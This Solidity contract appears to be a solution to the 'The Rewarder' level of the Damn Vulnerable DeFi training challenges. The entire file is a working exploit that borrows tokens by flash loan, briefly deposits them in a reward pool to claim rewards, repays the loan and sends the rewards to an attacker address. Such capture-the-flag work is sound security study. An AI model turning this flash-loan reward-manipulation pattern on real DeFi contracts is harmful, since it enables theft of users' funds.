// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/src-default/the-rewarder/FlashLoanerPool.sol";
import "src/src-default/the-rewarder/TheRewarderPool.sol";
import "src/src-default/DamnValuableToken.sol";

contract AttackRewarder {
    FlashLoanerPool pool;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool rewardPool;
    address payable owner;

    constructor(address poolAddress, address liquidityTokenAddress, address awardPoolAddress, address payable _owner) {
        pool = FlashLoanerPool(poolAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardPool = TheRewarderPool(awardPoolAddress);
        owner = _owner;
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        // Approve the award pool to spend our borrowed funds
        liquidityToken.approve(address(rewardPool), amount);

        // Deposit massive portion of funds and distributes awards
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);

        // Return funds
        liquidityToken.transfer(address(pool), amount);

        // Transfer funds back to attacker
        uint256 currBal = rewardPool.rewardToken().balanceOf(address(this));
        rewardPool.rewardToken().transfer(owner, currBal);
    }
}
